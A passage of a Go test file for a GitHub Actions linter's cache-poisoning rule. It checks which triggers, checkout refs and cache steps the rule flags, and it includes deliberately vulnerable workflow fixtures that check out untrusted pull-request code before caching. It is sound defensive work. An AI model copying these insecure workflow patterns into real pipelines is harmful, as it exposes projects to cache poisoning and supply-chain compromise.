package core

import (
	"strings"
	"testing"

	"github.com/sisaku-security/sisakulint/pkg/ast"
)

func TestNewCachePoisoningRule(t *testing.T) {
	rule := NewCachePoisoningRule()

	if rule.RuleName != "cache-poisoning" {
		t.Errorf("RuleName = %q, want %q", rule.RuleName, "cache-poisoning")
	}
	if rule.RuleDesc == "" {
		t.Error("RuleDesc should not be empty")
	}
}

func TestIsUnsafeTrigger(t *testing.T) {
	tests := []struct {
		name      string
		eventName string
		want      bool
	}{
		{"issue_comment is unsafe", "issue_comment", true},
		{"pull_request_target is unsafe", "pull_request_target", true},
		{"workflow_run is unsafe", "workflow_run", true},
		{"push is safe", "push", false},
		{"pull_request is safe", "pull_request", false},
		{"schedule is safe", "schedule", false},
		{"empty is safe", "", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := IsUnsafeTrigger(tt.eventName)
			if got != tt.want {
				t.Errorf("IsUnsafeTrigger(%q) = %v, want %v", tt.eventName, got, tt.want)
			}
		})
	}
}

func TestIsUnsafeCheckoutRef(t *testing.T) {
	tests := []struct {
		name     string
		refValue string
		want     bool
	}{
		{
			name:     "github.head_ref is unsafe",
			refValue: "${{ github.head_ref }}",
			want:     true,
		},
		{
			name:     "github.event.pull_request.head.sha is unsafe",
			refValue: "${{ github.event.pull_request.head.sha }}",
			want:     true,
		},
		{
			name:     "github.event.pull_request.head.ref is unsafe",
			refValue: "${{ github.event.pull_request.head.ref }}",
			want:     true,
		},
		{
			name:     "refs/pull merge ref is unsafe",
			refValue: "refs/pull/${{ github.event.number }}/merge",
			want:     true,
		},
		{
			name:     "steps.*.outputs.head_sha is unsafe (CodeQL example)",
			refValue: "${{ steps.comment-branch.outputs.head_sha }}",
			want:     true,
		},
		{
			name:     "steps.*.outputs.head_ref is unsafe",
			refValue: "${{ steps.pr-info.outputs.head_ref }}",
			want:     true,
		},
		{
			name:     "kebab-case head-sha is unsafe",
			refValue: "${{ steps.branch.outputs.head-sha }}",
			want:     true,
		},
		{
			name:     "nested head.sha is unsafe",
			refValue: "${{ steps.data.outputs.head.sha }}",
			want:     true,
		},
		{
			name:     "unknown expression is unsafe (conservative)",
			refValue: "${{ steps.unknown.outputs.something }}",
			want:     true,
		},
		{
			name:     "empty is safe",
			refValue: "",
			want:     false,
		},
		{
			name:     "main branch is safe",
			refValue: "main",
			want:     false,
		},
		{
			name:     "github.ref is safe",
			refValue: "${{ github.ref }}",
			want:     false,
		},
		{
			name:     "github.sha is safe",
			refValue: "${{ github.sha }}",
			want:     false,
		},
		{
			name:     "github.base_ref is safe",
			refValue: "${{ github.base_ref }}",
			want:     false,
		},
		{
			name:     "default branch is safe",
			refValue: "${{ github.event.repository.default_branch }}",
			want:     false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := IsUnsafeCheckoutRef(tt.refValue)
			if got != tt.want {
				t.Errorf("IsUnsafeCheckoutRef(%q) = %v, want %v", tt.refValue, got, tt.want)
			}
		})
	}
}

func TestIsCacheAction(t *testing.T) {
	tests := []struct {
		name   string
		uses   string
		inputs map[string]*ast.Input
		want   bool
	}{
		{
			name:   "actions/cache is cache action",
			uses:   "actions/cache@v3",
			inputs: nil,
			want:   true,
		},
		{
			name:   "actions/cache without version is cache action",
			uses:   "actions/cache",
			inputs: nil,
			want:   true,
		},
		{
			name:   "actions/cache/save is cache action",
			uses:   "actions/cache/save@v4",
			inputs: nil,
			want:   true,
		},
		{
			name:   "actions/cache/restore is cache action",
			uses:   "actions/cache/restore@v4",
			inputs: nil,
			want:   true,
		},
		{
			name: "actions/setup-node with cache: npm",
			uses: "actions/setup-node@v4",
			inputs: map[string]*ast.Input{
				"cache": {Value: &ast.String{Value: "npm"}},
			},
			want: true,
		},
		{
			name: "actions/setup-python with cache: pip",
			uses: "actions/setup-python@v5",
			inputs: map[string]*ast.Input{
				"cache": {Value: &ast.String{Value: "pip"}},
			},
			want: true,
		},
		{
			name: "actions/setup-go with cache: true",
			uses: "actions/setup-go@v4",
			inputs: map[string]*ast.Input{
				"cache": {Value: &ast.String{Value: "true"}},
			},
			want: true,
		},
		{
			name: "actions/setup-node without cache",
			uses: "actions/setup-node@v4",
			inputs: map[string]*ast.Input{
				"node-version": {Value: &ast.String{Value: "18"}},
			},
			want: false,
		},
		{
			name: "actions/setup-node with cache: false",
			uses: "actions/setup-node@v4",
			inputs: map[string]*ast.Input{
				"cache": {Value: &ast.String{Value: "false"}},
			},
			want: false,
		},
		{
			name:   "other action is not cache action",
			uses:   "actions/checkout@v4",
			inputs: nil,
			want:   false,
		},
		{
			name:   "empty uses",
			uses:   "",
			inputs: nil,
			want:   false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := isCacheAction(tt.uses, tt.inputs)
			if got != tt.want {
				t.Errorf("isCacheAction(%q, %v) = %v, want %v", tt.uses, tt.inputs, got, tt.want)
			}
		})
	}
}

type fakeActionMetadataResolver map[string]*ActionMetadata

func (f fakeActionMetadataResolver) FindMetadata(spec string) (*ActionMetadata, error) {
	return f[spec], nil
}

func TestCachePoisoningRuleDetectsRemoteCompositeCacheAfterUnsafeCheckout(t *testing.T) {
	t.Parallel()

	workflowYAML := `
name: Bundle Size
on: pull_request_target
jobs:
  benchmark-pr:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6.0.2
        with:
          ref: refs/pull/${{ github.event.pull_request.number }}/merge
      - uses: TanStack/config/.github/setup@main
`
	workflow, errs := Parse([]byte(workflowYAML))
	if len(errs) > 0 {
		t.Fatalf("Parse returned errors: %v", errs)
	}

	resolver := fakeActionMetadataResolver{
		"TanStack/config/.github/setup@main": {
			Runs: &ActionRunsMetadata{
				Using: "composite",
				Steps: []*ActionStepMetadata{
					{
						Uses: "actions/cache@v5",
						With: ActionStepWithMetadata{
							"path": "~/.pnpm-store",
							"key":  "Linux-pnpm-store-${{ hashFiles('**/pnpm-lock.yaml') }}",
						},
					},
				},
			},
		},
	}
	rule := NewCachePoisoningRule(resolver)

	visitor := NewSyntaxTreeVisitor()
	visitor.AddVisitor(rule)
	if err := visitor.VisitTree(workflow); err != nil {
		t.Fatalf("VisitTree returned error: %v", err)
	}

	ruleErrs := rule.Errors()
	if len(ruleErrs) != 1 {
		t.Fatalf("len(rule.Errors()) = %d, want 1: %#v", len(ruleErrs), ruleErrs)
	}

	got := ruleErrs[0].Description
	for _, want := range []string{
		"TanStack/config/.github/setup@main",
		"actions/cache@v5",
		"cache scope crossing",
		"critical",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("error description %q does not contain %q", got, want)
		}
	}
}

func TestCachePoisoningRuleDetectsRemoteCompositeCacheSaveAfterUnsafeCheckout(t *testing.T) {
	t.Parallel()

	workflowYAML := `
name: Bundle Size
on: pull_request_target
jobs:
  benchmark-pr:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6.0.2
        with:
          ref: refs/pull/${{ github.event.pull_request.number }}/merge
      - uses: TanStack/config/.github/setup@main
`
	workflow, errs := Parse([]byte(workflowYAML))
	if len(errs) > 0 {
		t.Fatalf("Parse returned errors: %v", errs)
	}

	resolver := fakeActionMetadataResolver{
		"TanStack/config/.github/setup@main": {
			Runs: &ActionRunsMetadata{
				Using: "composite",
				Steps: []*ActionStepMetadata{
					{Uses: "actions/cache/save@v4"},
				},
			},
		},
	}
	rule := NewCachePoisoningRule(resolver)

	visitor := NewSyntaxTreeVisitor()
	visitor.AddVisitor(rule)
	if err := visitor.VisitTree(workflow); err != nil {
		t.Fatalf("VisitTree returned error: %v", err)
	}

	ruleErrs := rule.Errors()
	if len(ruleErrs) != 1 {
		t.Fatalf("len(rule.Errors()) = %d, want 1: %#v", len(ruleErrs), ruleErrs)
	}

	got := ruleErrs[0].Description
	for _, want := range []string{
		"TanStack/config/.github/setup@main",
		"actions/cache/save@v4",
		"cache scope crossing",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("error description %q does not contain %q", got, want)
		}
	}
}

func TestCachePoisoningRuleUsesAllProvidedMetadataResolvers(t *testing.T) {
	t.Parallel()

	workflowYAML := `
name: Bundle Size
on: pull_request_target
jobs:
  benchmark-pr:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6.0.2
        with:
          ref: refs/pull/${{ github.event.pull_request.number }}/merge
      - uses: TanStack/config/.github/setup@main
`
	workflow, errs := Parse([]byte(workflowYAML))
	if len(errs) > 0 {
		t.Fatalf("Parse returned errors: %v", errs)
	}

	emptyResolver := fakeActionMetadataResolver{}
	cacheResolver := fakeActionMetadataResolver{
		"TanStack/config/.github/setup@main": {
			Runs: &ActionRunsMetadata{
				Using: "composite",
				Steps: []*ActionStepMetadata{
					{Uses: "actions/cache@v5"},
				},
			},
		},
	}
	rule := NewCachePoisoningRule(emptyResolver, cacheResolver)

	visitor := NewSyntaxTreeVisitor()
	visitor.AddVisitor(rule)
	if err := visitor.VisitTree(workflow); err != nil {
		t.Fatalf("VisitTree returned error: %v", err)
	}

	ruleErrs := rule.Errors()
	if len(ruleErrs) != 1 {
		t.Fatalf("len(rule.Errors()) = %d, want 1: %#v", len(ruleErrs), ruleErrs)
	}
	if got := ruleErrs[0].Description; !strings.Contains(got, "actions/cache@v5") {
		t.Fatalf("error description %q does not contain actions/cache@v5", got)
	}
}

func TestCachePoisoningRuleDetectsTransitiveRemoteCompositeCacheAfterUnsafeCheckout(t *testing.T) {
	t.Parallel()

	workflowYAML := `
name: Bundle Size
on: pull_request_target
jobs:
  benchmark-pr:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6.0.2
        with:
          ref: refs/pull/${{ github.event.pull_request.number }}/merge
      - uses: TanStack/config/.github/setup@main
`
	workflow, errs := Parse([]byte(workflowYAML))
	if len(errs) > 0 {
		t.Fatalf("Parse returned errors: %v", errs)
	}

	resolver := fakeActionMetadataResolver{
		"TanStack/config/.github/setup@main": {
			Runs: &ActionRunsMetadata{
				Using: "composite",
				Steps: []*ActionStepMetadata{
					{Uses: "owner/nested-action@main"},
				},
			},
		},
		"owner/nested-action@main": {
			Runs: &ActionRunsMetadata{
				Using: "composite",
				Steps: []*ActionStepMetadata{
					{Uses: "actions/setup-node@v4", With: ActionStepWithMetadata{"cache": "pnpm"}},
				},
			},
		},
	}
	rule := NewCachePoisoningRule(resolver)

	visitor := NewSyntaxTreeVisitor()
	visitor.AddVisitor(rule)
	if err := visitor.VisitTree(workflow); err != nil {
		t.Fatalf("VisitTree returned error: %v", err)
	}

	ruleErrs := rule.Errors()
	if len(ruleErrs) != 1 {
		t.Fatalf("len(rule.Errors()) = %d, want 1: %#v", len(ruleErrs), ruleErrs)
	}

	got := ruleErrs[0].Description
	for _, want := range []string{
		"TanStack/config/.github/setup@main",
		"owner/nested-action@main",
		"actions/setup-node@v4",
		"chain:",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("error description %q does not contain %q", got, want)
		}
	}
}

func TestCachePoisoningRuleChecksHierarchyForCompositeCacheAction(t *testing.T) {
	t.Parallel()

	workflowYAML := `
name: Bundle Size
on: [pull_request_target, workflow_dispatch]
jobs:
  benchmark-pr:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6.0.2
        with:
          ref: refs/pull/${{ github.event.pull_request.number }}/merge
      - uses: TanStack/config/.github/setup@main
`
	workflow, errs := Parse([]byte(workflowYAML))
	if len(errs) > 0 {
		t.Fatalf("Parse returned errors: %v", errs)
	}

	resolver := fakeActionMetadataResolver{
		"TanStack/config/.github/setup@main": {
			Runs: &ActionRunsMetadata{
				Using: "composite",
				Steps: []*ActionStepMetadata{
					{Uses: "actions/cache@v5"},
				},
			},
		},
	}
	rule := NewCachePoisoningRule(resolver)

	visitor := NewSyntaxTreeVisitor()
	visitor.AddVisitor(rule)
	if err := visitor.VisitTree(workflow); err != nil {
		t.Fatalf("VisitTree returned error: %v", err)
	}

	var foundComposite, foundHierarchy bool
	for _, ruleErr := range rule.Errors() {
		if strings.Contains(ruleErr.Description, "composite action") {
			foundComposite = true
		}
		if strings.Contains(ruleErr.Description, "cache hierarchy exploitation risk") {
			foundHierarchy = true
		}
	}
	if !foundComposite {
		t.Fatalf("expected composite cache poisoning error, got %#v", rule.Errors())
	}
	if !foundHierarchy {
		t.Fatalf("expected hierarchy exploitation error for composite cache action, got %#v", rule.Errors())
	}
}

func TestCachePoisoningRuleDetectsMutableRemoteCompositeAfterUnsafeCheckout(t *testing.T) {
	t.Parallel()

	workflowYAML := `
name: Bundle Size
on: pull_request_target
jobs:
  benchmark-pr:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6.0.2
        with:
          ref: refs/pull/${{ github.event.pull_request.number }}/merge
      - uses: TanStack/config/.github/setup@main
`
	workflow, errs := Parse([]byte(workflowYAML))
	if len(errs) > 0 {
		t.Fatalf("Parse returned errors: %v", errs)
	}

	resolver := fakeActionMetadataResolver{
		"TanStack/config/.github/setup@main": {
			Runs: &ActionRunsMetadata{
				Using: "composite",
				Steps: []*ActionStepMetadata{
					{Uses: "pnpm/action-setup@739bfe42ca9233c5e6aca07c1a25a9d34aca49b0"},
				},
			},
		},
	}
	rule := NewCachePoisoningRule(resolver)

	visitor := NewSyntaxTreeVisitor()
	visitor.AddVisitor(rule)
	if err := visitor.VisitTree(workflow); err != nil {
		t.Fatalf("VisitTree returned error: %v", err)
	}

	ruleErrs := rule.Errors()
	if len(ruleErrs) != 1 {
		t.Fatalf("len(rule.Errors()) = %d, want 1: %#v", len(ruleErrs), ruleErrs)
	}

	got := ruleErrs[0].Description
	for _, want := range []string{
		"TanStack/config/.github/setup@main",
		"mutable remote composite action",
		"cache scope crossing",
		"cannot be ruled out",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("error description %q does not contain %q", got, want)
		}
	}
}

func TestCachePoisoningRuleSkipsJobFilteredToSafeTrigger(t *testing.T) {
	t.Parallel()

	workflowYAML := `
name: Bundle Size
on: [pull_request_target, push]
jobs:
  push-only:
    if: github.event_name == 'push'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6.0.2
        with:
          ref: refs/pull/${{ github.event.pull_request.number }}/merge
      - uses: TanStack/config/.github/setup@main
`
	workflow, errs := Parse([]byte(workflowYAML))
	if len(errs) > 0 {
		t.Fatalf("Parse returned errors: %v", errs)
	}

	resolver := fakeActionMetadataResolver{
		"TanStack/config/.github/setup@main": {
			Runs: &ActionRunsMetadata{
				Using: "composite",
				Steps: []*ActionStepMetadata{
					{Uses: "actions/cache@v5"},
				},
			},
		},
	}
	rule := NewCachePoisoningRule(resolver)

	visitor := NewSyntaxTreeVisitor()
	visitor.AddVisitor(rule)
	if err := visitor.VisitTree(workflow); err != nil {
		t.Fatalf("VisitTree returned error: %v", err)
	}

	if got := len(rule.Errors()); got != 0 {
		t.Fatalf("len(rule.Errors()) = %d, want 0: %#v", got, rule.Errors())
	}
}

func TestCachePoisoningRuleDoesNotReportMutableRemoteNonCompositeAction(t *testing.T) {
	t.Parallel()

	workflowYAML := `
name: Bundle Size
on: pull_request_target
jobs:
  benchmark-pr:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6.0.2
        with:
          ref: refs/pull/${{ github.event.pull_request.number }}/merge
      - uses: TanStack/config/.github/setup@main
`
	workflow, errs := Parse([]byte(workflowYAML))
	if len(errs) > 0 {
		t.Fatalf("Parse returned errors: %v", errs)
	}

	resolver := fakeActionMetadataResolver{
		"TanStack/config/.github/setup@main": {
			Runs: &ActionRunsMetadata{Using: "node20"},
		},
	}
	rule := NewCachePoisoningRule(resolver)

	visitor := NewSyntaxTreeVisitor()
	visitor.AddVisitor(rule)
	if err := visitor.VisitTree(workflow); err != nil {
		t.Fatalf("VisitTree returned error: %v", err)
	}

	if got := len(rule.Errors()); got != 0 {
		t.Fatalf("len(rule.Errors()) = %d, want 0: %#v", got, rule.Errors())
	}
}

func TestCachePoisoningRule_VisitWorkflowPre(t *testing.T) {
	rule := NewCachePoisoningRule()

	workflow := &ast.Workflow{
		On: []ast.Event{
			&ast.WebhookEvent{Hook: &ast.String{Value: "pull_request_target"}},
			&ast.WebhookEvent{Hook: &ast.String{Value: "push"}},
		},
	}

	err := rule.VisitWorkflowPre(workflow)
	if err != nil {
		t.Errorf("VisitWorkflowPre() error = %v", err)
	}

	if len(rule.unsafeTriggers) != 1 {
		t.Errorf("unsafeTriggers length = %d, want 1", len(rule.unsafeTriggers))
	}
	if rule.unsafeTriggers[0] != EventPullRequestTarget {
		t.Errorf("unsafeTriggers[0] = %q, want %q", rule.unsafeTriggers[0], EventPullRequestTarget)
	}
}

func TestCachePoisoningRule_DetectsVulnerableWorkflow(t *testing.T) {
	rule := NewCachePoisoningRule()

	// Simulate workflow with pull_request_target trigger
	workflow := &ast.Workflow{
		On: []ast.Event{
			&ast.WebhookEvent{Hook: &ast.String{Value: "pull_request_target"}},
		},
	}
	_ = rule.VisitWorkflowPre(workflow)

	// Simulate job start
	job := &ast.Job{}
	_ = rule.VisitJobPre(job)

	// Simulate checkout with unsafe ref
	checkoutStep := &ast.Step{
		Pos: &ast.Position{Line: 10, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/checkout@v4"},
			Inputs: map[string]*ast.Input{
				"ref": {Value: &ast.String{Value: "${{ github.head_ref }}"}},
			},
		},
	}
	_ = rule.VisitStep(checkoutStep)

	// Simulate cache action
	cacheStep := &ast.Step{
		Pos: &ast.Position{Line: 15, Col: 1},
		Exec: &ast.ExecAction{
			Uses:   &ast.String{Value: "actions/cache@v3"},
			Inputs: map[string]*ast.Input{},
		},
	}
	_ = rule.VisitStep(cacheStep)

	errors := rule.Errors()
	if len(errors) != 1 {
		t.Fatalf("Expected 1 error, got %d", len(errors))
	}

	if errors[0].LineNumber != 15 {
		t.Errorf("Error line = %d, want 15", errors[0].LineNumber)
	}
}

func TestCachePoisoningRule_NoErrorWithSafeTrigger(t *testing.T) {
	rule := NewCachePoisoningRule()

	// Simulate workflow with safe trigger
	workflow := &ast.Workflow{
		On: []ast.Event{
			&ast.WebhookEvent{Hook: &ast.String{Value: "pull_request"}},
		},
	}
	_ = rule.VisitWorkflowPre(workflow)

	job := &ast.Job{}
	_ = rule.VisitJobPre(job)

	checkoutStep := &ast.Step{
		Pos: &ast.Position{Line: 10, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/checkout@v4"},
			Inputs: map[string]*ast.Input{
				"ref": {Value: &ast.String{Value: "${{ github.head_ref }}"}},
			},
		},
	}
	_ = rule.VisitStep(checkoutStep)

	cacheStep := &ast.Step{
		Pos: &ast.Position{Line: 15, Col: 1},
		Exec: &ast.ExecAction{
			Uses:   &ast.String{Value: "actions/cache@v3"},
			Inputs: map[string]*ast.Input{},
		},
	}
	_ = rule.VisitStep(cacheStep)

	errors := rule.Errors()
	if len(errors) != 0 {
		t.Errorf("Expected 0 errors with safe trigger, got %d", len(errors))
	}
}

func TestCachePoisoningRule_NoErrorWithoutUnsafeCheckout(t *testing.T) {
	rule := NewCachePoisoningRule()

	// Simulate workflow with unsafe trigger but no unsafe checkout
	workflow := &ast.Workflow{
		On: []ast.Event{
			&ast.WebhookEvent{Hook: &ast.String{Value: "pull_request_target"}},
		},
	}
	_ = rule.VisitWorkflowPre(workflow)

	job := &ast.Job{}
	_ = rule.VisitJobPre(job)

	// Checkout without ref (default behavior - safe)
	checkoutStep := &ast.Step{
		Pos: &ast.Position{Line: 10, Col: 1},
		Exec: &ast.ExecAction{
			Uses:   &ast.String{Value: "actions/checkout@v4"},
			Inputs: map[string]*ast.Input{},
		},
	}
	_ = rule.VisitStep(checkoutStep)

	cacheStep := &ast.Step{
		Pos: &ast.Position{Line: 15, Col: 1},
		Exec: &ast.ExecAction{
			Uses:   &ast.String{Value: "actions/cache@v3"},
			Inputs: map[string]*ast.Input{},
		},
	}
	_ = rule.VisitStep(cacheStep)

	errors := rule.Errors()
	if len(errors) != 0 {
		t.Errorf("Expected 0 errors without unsafe checkout, got %d", len(errors))
	}
}

func TestCachePoisoningRule_DetectsSetupNodeWithCache(t *testing.T) {
	rule := NewCachePoisoningRule()

	workflow := &ast.Workflow{
		On: []ast.Event{
			&ast.WebhookEvent{Hook: &ast.String{Value: "issue_comment"}},
		},
	}
	_ = rule.VisitWorkflowPre(workflow)

	job := &ast.Job{}
	_ = rule.VisitJobPre(job)

	checkoutStep := &ast.Step{
		Pos: &ast.Position{Line: 10, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/checkout@v4"},
			Inputs: map[string]*ast.Input{
				"ref": {Value: &ast.String{Value: "${{ github.event.pull_request.head.sha }}"}},
			},
		},
	}
	_ = rule.VisitStep(checkoutStep)

	setupNodeStep := &ast.Step{
		Pos: &ast.Position{Line: 15, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/setup-node@v4"},
			Inputs: map[string]*ast.Input{
				"node-version": {Value: &ast.String{Value: "18"}},
				"cache":        {Value: &ast.String{Value: "npm"}},
			},
		},
	}
	_ = rule.VisitStep(setupNodeStep)

	errors := rule.Errors()
	if len(errors) != 1 {
		t.Fatalf("Expected 1 error for setup-node with cache, got %d", len(errors))
	}
}

func TestCachePoisoningRule_AutoFixer(t *testing.T) {
	rule := NewCachePoisoningRule()

	workflow := &ast.Workflow{
		On: []ast.Event{
			&ast.WebhookEvent{Hook: &ast.String{Value: "pull_request_target"}},
		},
	}
	_ = rule.VisitWorkflowPre(workflow)

	job := &ast.Job{}
	_ = rule.VisitJobPre(job)

	checkoutStep := &ast.Step{
		Pos: &ast.Position{Line: 10, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/checkout@v4"},
			Inputs: map[string]*ast.Input{
				"ref": {Value: &ast.String{Value: "${{ github.head_ref }}"}},
			},
		},
	}
	_ = rule.VisitStep(checkoutStep)

	cacheStep := &ast.Step{
		Pos: &ast.Position{Line: 15, Col: 1},
		Exec: &ast.ExecAction{
			Uses:   &ast.String{Value: "actions/cache@v3"},
			Inputs: map[string]*ast.Input{},
		},
	}
	_ = rule.VisitStep(cacheStep)

	autoFixers := rule.AutoFixers()
	if len(autoFixers) != 1 {
		t.Errorf("Expected 1 auto-fixer, got %d", len(autoFixers))
	}

	if len(autoFixers) > 0 && autoFixers[0].RuleName() != "cache-poisoning" {
		t.Errorf("AutoFixer rule name = %q, want %q", autoFixers[0].RuleName(), "cache-poisoning")
	}
}

func TestCachePoisoningRule_JobIsolation(t *testing.T) {
	rule := NewCachePoisoningRule()

	workflow := &ast.Workflow{
		On: []ast.Event{
			&ast.WebhookEvent{Hook: &ast.String{Value: "pull_request_target"}},
		},
	}
	_ = rule.VisitWorkflowPre(workflow)

	// First job with unsafe checkout
	job1 := &ast.Job{}
	_ = rule.VisitJobPre(job1)

	checkoutStep1 := &ast.Step{
		Pos: &ast.Position{Line: 10, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/checkout@v4"},
			Inputs: map[string]*ast.Input{
				"ref": {Value: &ast.String{Value: "${{ github.head_ref }}"}},
			},
		},
	}
	_ = rule.VisitStep(checkoutStep1)
	_ = rule.VisitJobPost(job1)

	// Second job should have clean state
	job2 := &ast.Job{}
	_ = rule.VisitJobPre(job2)

	// Cache without unsafe checkout in this job
	cacheStep := &ast.Step{
		Pos: &ast.Position{Line: 30, Col: 1},
		Exec: &ast.ExecAction{
			Uses:   &ast.String{Value: "actions/cache@v3"},
			Inputs: map[string]*ast.Input{},
		},
	}
	_ = rule.VisitStep(cacheStep)

	errors := rule.Errors()
	if len(errors) != 0 {
		t.Errorf("Expected 0 errors due to job isolation, got %d", len(errors))
	}
}

func TestCachePoisoningRule_AutoFixerRegisteredOnce(t *testing.T) {
	rule := NewCachePoisoningRule()

	workflow := &ast.Workflow{
		On: []ast.Event{
			&ast.WebhookEvent{Hook: &ast.String{Value: "pull_request_target"}},
		},
	}
	_ = rule.VisitWorkflowPre(workflow)

	job := &ast.Job{}
	_ = rule.VisitJobPre(job)

	checkoutStep := &ast.Step{
		Pos: &ast.Position{Line: 10, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/checkout@v4"},
			Inputs: map[string]*ast.Input{
				"ref": {Value: &ast.String{Value: "${{ github.head_ref }}"}},
			},
		},
	}
	_ = rule.VisitStep(checkoutStep)

	// First cache action
	setupNodeStep := &ast.Step{
		Pos: &ast.Position{Line: 15, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/setup-node@v4"},
			Inputs: map[string]*ast.Input{
				"cache": {Value: &ast.String{Value: "npm"}},
			},
		},
	}
	_ = rule.VisitStep(setupNodeStep)

	// Second cache action
	cacheStep := &ast.Step{
		Pos: &ast.Position{Line: 20, Col: 1},
		Exec: &ast.ExecAction{
			Uses:   &ast.String{Value: "actions/cache@v3"},
			Inputs: map[string]*ast.Input{},
		},
	}
	_ = rule.VisitStep(cacheStep)

	// Should have 2 errors (one for each cache action)
	errors := rule.Errors()
	if len(errors) != 2 {
		t.Errorf("Expected 2 errors, got %d", len(errors))
	}

	// But only 1 auto-fixer (for the checkout step)
	autoFixers := rule.AutoFixers()
	if len(autoFixers) != 1 {
		t.Errorf("Expected 1 auto-fixer even with multiple cache actions, got %d", len(autoFixers))
	}
}

func TestCachePoisoningRule_MultipleCheckouts(t *testing.T) {
	rule := NewCachePoisoningRule()

	workflow := &ast.Workflow{
		On: []ast.Event{
			&ast.WebhookEvent{Hook: &ast.String{Value: "pull_request_target"}},
		},
	}
	_ = rule.VisitWorkflowPre(workflow)

	job := &ast.Job{}
	_ = rule.VisitJobPre(job)

	// First: unsafe checkout
	unsafeCheckoutStep := &ast.Step{
		Pos: &ast.Position{Line: 10, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/checkout@v4"},
			Inputs: map[string]*ast.Input{
				"ref": {Value: &ast.String{Value: "${{ github.head_ref }}"}},
			},
		},
	}
	_ = rule.VisitStep(unsafeCheckoutStep)

	// Second: safe checkout (resets unsafe state)
	safeCheckoutStep := &ast.Step{
		Pos: &ast.Position{Line: 15, Col: 1},
		Exec: &ast.ExecAction{
			Uses:   &ast.String{Value: "actions/checkout@v4"},
			Inputs: map[string]*ast.Input{},
		},
	}
	_ = rule.VisitStep(safeCheckoutStep)

	// Cache after safe checkout should NOT trigger warning
	cacheStep := &ast.Step{
		Pos: &ast.Position{Line: 20, Col: 1},
		Exec: &ast.ExecAction{
			Uses:   &ast.String{Value: "actions/cache@v3"},
			Inputs: map[string]*ast.Input{},
		},
	}
	_ = rule.VisitStep(cacheStep)

	errors := rule.Errors()
	if len(errors) != 0 {
		t.Errorf("Expected 0 errors after safe checkout, got %d", len(errors))
	}
}

func TestCachePoisoningRule_CodeQLVulnerableExample(t *testing.T) {
	rule := NewCachePoisoningRule()

	// CodeQL example: issue_comment + steps.*.outputs.head_sha
	workflow := &ast.Workflow{
		On: []ast.Event{
			&ast.WebhookEvent{Hook: &ast.String{Value: "issue_comment"}},
		},
	}
	_ = rule.VisitWorkflowPre(workflow)

	job := &ast.Job{}
	_ = rule.VisitJobPre(job)

	// Checkout with steps output (CodeQL vulnerable pattern)
	checkoutStep := &ast.Step{
		Pos: &ast.Position{Line: 10, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/checkout@v3"},
			Inputs: map[string]*ast.Input{
				"ref": {Value: &ast.String{Value: "${{ steps.comment-branch.outputs.head_sha }}"}},
			},
		},
	}
	_ = rule.VisitStep(checkoutStep)

	// Setup Python (no cache input, so not a cache action)
	setupPythonStep := &ast.Step{
		Pos: &ast.Position{Line: 15, Col: 1},
		Exec: &ast.ExecAction{
			Uses:   &ast.String{Value: "actions/setup-python@v5"},
			Inputs: map[string]*ast.Input{},
		},
	}
	_ = rule.VisitStep(setupPythonStep)

	// Cache action
	cacheStep := &ast.Step{
		Pos: &ast.Position{Line: 20, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/cache@v4"},
			Inputs: map[string]*ast.Input{
				"path": {Value: &ast.String{Value: "~/.cache/pip"}},
			},
		},
	}
	_ = rule.VisitStep(cacheStep)

	errors := rule.Errors()
	if len(errors) != 1 {
		t.Fatalf("Expected 1 error for CodeQL vulnerable example, got %d", len(errors))
	}

	if errors[0].LineNumber != 20 {
		t.Errorf("Error line = %d, want 20", errors[0].LineNumber)
	}
}

// Tests for direct cache poisoning (untrusted input in cache key/restore-keys/path)

func TestCachePoisoningRule_DirectCachePoison_UntrustedKey(t *testing.T) {
	t.Parallel()
	rule := NewCachePoisoningRule()

	// Direct cache poisoning works with any trigger (even safe ones like pull_request)
	workflow := &ast.Workflow{
		On: []ast.Event{
			&ast.WebhookEvent{Hook: &ast.String{Value: "pull_request"}},
		},
	}
	_ = rule.VisitWorkflowPre(workflow)

	job := &ast.Job{}
	_ = rule.VisitJobPre(job)

	// Cache action with untrusted input in key
	cacheStep := &ast.Step{
		Pos: &ast.Position{Line: 10, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/cache@v4"},
			Inputs: map[string]*ast.Input{
				"path": {Value: &ast.String{Value: "~/.npm", Pos: &ast.Position{Line: 12, Col: 15}}},
				"key": {Value: &ast.String{
					Value: "npm-${{ github.event.pull_request.head.ref }}",
					Pos:   &ast.Position{Line: 11, Col: 14},
				}},
			},
		},
	}
	_ = rule.VisitStep(cacheStep)

	errors := rule.Errors()
	if len(errors) != 1 {
		t.Fatalf("Expected 1 error for untrusted cache key, got %d", len(errors))
	}

	if !strings.Contains(errors[0].Description, "cache poisoning via untrusted input") {
